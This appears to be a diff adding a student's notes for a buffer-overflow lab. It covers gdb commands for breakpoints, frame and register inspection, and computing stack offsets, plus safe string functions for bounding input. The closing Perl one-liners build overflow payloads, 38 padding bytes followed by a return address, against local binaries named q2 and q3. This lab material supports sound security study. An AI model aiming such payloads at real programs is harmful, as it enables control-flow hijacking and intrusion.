@@ -1,1 +1,29 @@
-break <function_name>
+break <function_name> <line_no>
+set args <param>
+break 
+clear
+run <Param>
+info frame
+info stack
+info reg ebp
+
+p/d <ebp>-<ebp>
+p/d 0xffffd264-0xffffd318  -> Find the offset bytes between address
+
+x/<offset>bx <function_name>
+x/3bx hanoi
+
+
+list
+
+
+Bound the input size
+--------------------
+    1. snprintf(buffer, total_size,  "%s", source);
+    2. strncat(buffer, source, size_available);
+
+Perl Commands:
+--------------
+perl -e 'system "./q2", "A"x38 . "\xee\x83\x04\x08"'
+perl -e 'system "./q2", "A"x38 . pack("V", 0x080483ee)'
+perl -e 'print "515 134513494\n-1 1\n"' | ./q3   -> To give the stdin Input
